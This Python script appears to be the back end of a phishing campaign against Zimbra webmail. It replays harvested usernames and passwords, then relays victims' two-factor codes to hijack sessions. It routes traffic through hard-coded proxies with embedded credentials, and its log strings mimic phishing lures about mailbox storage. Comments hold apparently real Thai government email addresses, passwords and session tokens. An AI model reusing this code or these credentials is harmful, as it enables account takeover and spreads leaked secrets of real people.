import requests
import requests.auth
import json
import time
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from modules.requests_digest_proxy import HTTPProxyDigestAuth

# static parameters
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    # "upgrade-insecure-requests": "1",
    # "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;,q=0.8,application/signed-exchange;v=b3;q=0.9",
    # "accept-encoding": "gzip, deflate, br,",
    # "accept-language": "en-US,en;q=0.9,",
}
th_admin_users = open("modules/zimbra_th_admin.txt").read().split("\n")

# log
login_failed_log = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password."
expired_session_log = "Your session has expired. Please login again."
limited_storage_log = "Limited for your storage. Please login to validate your Mailbox."
unlimited_storage_log = "Your mailbox has been successfully increased in storage. Redirecting ..."
verify_user_success_log = "Verify successfully. Redirecting ..."

# process
# anusak.s@labai.or.th
# Adminmail@1


def login(domain, user, pwd, isDefault=True):
    # step -1: choose proxy
    proxy = "http://gnganh80:GoJPTu@64.137.34.25:15949"
    proxy_dict = {"http": proxy, "https": proxy}

    # step 0: init result
    resp = {
        "status_code": -1,
        "cookies": {},
        "resp": ""
    }

    #try:
    # step 1: get login_csrf
    sess_get = requests.Session()
    sess_get.trust_env=False
    # sess_get.auth = HTTPProxyDigestAuth('gnganh80', 'GoJPTu')
    r = sess_get.get("https://{}".format(domain), headers=headers, proxies = proxy_dict)
    # r = sess_get.get("https://{}".format(domain), headers=headers)
    with open("log.txt", "w", encoding='utf8') as f:
        f.write(r.text)
    cookies_dict = r.cookies.get_dict()
    ZM_LOGIN_CSRF = cookies_dict["ZM_LOGIN_CSRF"]
    # # print("## header step 1 ##")
    # # print(dict(r.headers.__dict__['_store']))
    # # print("## cookie step 1 ##")
    # # print(r.cookies.get_dict())

    # # step 2: login
    sess_post = requests.Session()
    sess_post.trust_env=False
    # sess_post.auth = HTTPProxyDigestAuth('gnganh80', 'GoJPTu')
    loginURL = "https://{}".format(domain)
    if isDefault:
        loginURL += "/zimbra"
    payload = {
        "loginOp": "login",
        "login_csrf": ZM_LOGIN_CSRF,
        "username": user,
        "password": pwd,
        "client": "preferred",
    }
    r = sess_post.post(loginURL, data=payload,
                    cookies=cookies_dict, headers=headers, proxies = proxy_dict)
    # r = sess_post.post(loginURL, data=payload,
    #                  cookies=cookies_dict, headers=headers, proxies = proxy_dict)
    return r.cookies.get_dict()
    #except:
    #    return {}
        # return {"__cfruid": "e3b2b55f39e8f307f7bb2638650b808219390877-1641439998", "ZM_AUTH_TOKEN": "0_0291f15375ff1532c3ba3c1eee760802e34eee28_69643d33363a31336236303762382d353439332d346631382d383132652d6664326663663164336239373b6578703d31333a313634313434333539383030353b76763d313a353b747970653d363a7a696d6272613b753d333a7466613b7469643d393a3739373834393535373b76657273696f6e3d31343a382e382e31355f47415f333836393b", "ZM_LOGIN_CSRF": "bc539cad-51b9-43ba-b146-c917a9b7acc3", "ZM_TEST": "true"}


def verify(domain, user, opt_code, req_cookies):
    # step -1: choose proxy
    proxy = "http://service_16914:fbf34df092@144.217.223.188:3129"
    proxy_dict = {"http": proxy, "https": proxy}

    # Step 1: process
    sess = requests.Session()
    payload = {
        "loginOp": "login",
        "login_csrf": req_cookies["ZM_LOGIN_CSRF"],
        "zrememberme": "",
        "totpcode": opt_code
    }
    try:
        # r = sess.post("https://{}".format(domain), data=payload,
        #               cookies=req_cookies, headers=headers)
        r = sess.post("https://{}".format(domain), data=payload,
                      cookies=req_cookies, headers=headers, proxies=proxy_dict)

        with open("log/zimbra-th-2auth/response-after/{}_{}_{}.html".format(
                time.strftime("%Y-%m-%d %H-%M-%S"), user, time.time()), "w") as f:
            f.write(r.text)
        return r.cookies.get_dict(), dict(r.headers.__dict__['_store']), ""
        # return r.cookies.get_dict(), dict(r.headers.__dict__['_store']), r.text
    except Exception as err:
        return {"error": str(err)}


# if __name__ == "__main__":
#     # params
#     domain = "accounts.mail.go.th"
#     user = "roongthip.sri@m-culture.go.th"
#     pwd = "P@ssw0rd2564"
#     # user = "be.sukanjanajtee@mfa.mail.go.th"
#     # pwd = "Emikenaki4"
#     cookies = {
#         "ZM_TEST": "true",
#         "__cfruid": "147a75556269cd13169c2f0f2ac75990db87a5d1-1641452857",
#         "ZM_AUTH_TOKEN": "0_de9214172f2d1bf2e4234378dfb96ac051f93d59_69643d33363a31336236303762382d353439332d346631382d383132652d6664326663663164336239373b6578703d31333a313634313435363435373734323b76763d313a353b747970653d363a7a696d6272613b753d333a7466613b7469643d31303a313932393536363938303b76657273696f6e3d31343a382e382e31355f47415f333836393b",
#         "ZM_LOGIN_CSRF": "7f1a6c8f-90c3-4eef-8032-1809ba026057"
#     }
#     # cookies = {"__cfruid": "e3b2b55f39e8f307f7bb2638650b808219390877-1641439998", "ZM_AUTH_TOKEN": "0_0291f15375ff1532c3ba3c1eee760802e34eee28_69643d33363a31336236303762382d353439332d346631382d383132652d6664326663663164336239373b6578703d31333a313634313434333539383030353b76763d313a353b747970653d363a7a696d6272613b753d333a7466613b7469643d393a3739373834393535373b76657273696f6e3d31343a382e382e31355f47415f333836393b", "ZM_LOGIN_CSRF": "bc539cad-51b9-43ba-b146-c917a9b7acc3", "ZM_TEST": "true"}

#     # process
#     cookies = login(domain, user, pwd, False)
#     print(cookies)
    # cookies, headers, text = verify(domain, "637284", cookies)
    # print(cookies)
    # print(text)
